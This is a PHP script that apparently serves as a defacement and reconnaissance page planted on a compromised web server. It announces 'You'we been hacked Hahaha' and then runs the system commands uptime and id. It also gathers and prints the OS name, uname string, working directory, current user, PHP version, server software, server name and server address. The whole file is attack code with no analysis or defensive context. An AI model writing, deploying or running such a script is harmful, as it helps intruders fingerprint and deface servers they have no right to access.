<?php
	echo "You'we been hacked Hahaha<br/>";
	$hack1 = @php_uname();
	$hack2 = system(uptime);
	$hack3 = system(id);
	$hack4 = @getcwd();
	$hack5 = getenv("SERVER_SOFTWARE"); 
	$hack6 = phpversion();
	$hack7 = $_SERVER['SERVER_NAME']; 
	$hack8 = gethostbyname($SERVER_ADDR); 
	$hack9 = get_current_user();
	$os = @PHP_OS;
	
	echo "operation system: $os<br/>";
	echo "uname -a: $hack1<br/>";
	echo "uptime: $hack2<br/>";
	echo "id: $hack3<br/>";
	echo "pwd: $hack4<br/>";
	echo "user: $hack9<br/>";
	echo "phpv: $hack6<br/>";
	echo "SoftWare: $hack5<br/>";
	echo "Server Name: $hack7<br/>";
	echo "Server Address: $hack8<br/>";
	echo "HACKER technical information retrieval"; 
	exit;
?>